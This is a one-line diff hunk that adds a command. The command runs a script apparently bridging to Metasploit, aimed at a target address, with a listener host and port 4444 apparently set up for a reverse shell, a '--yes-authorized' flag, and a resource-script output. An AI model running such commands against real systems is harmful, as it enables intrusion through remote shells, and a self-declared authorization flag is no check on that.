@@ -1,0 +1,1 @@
+python detector/msf_bridge.py --scan detector/dataflow.py --target http://10.0.0.5 --lhost 10.0.0.2 --lport 4444 --yes-authorized --out plan.rc
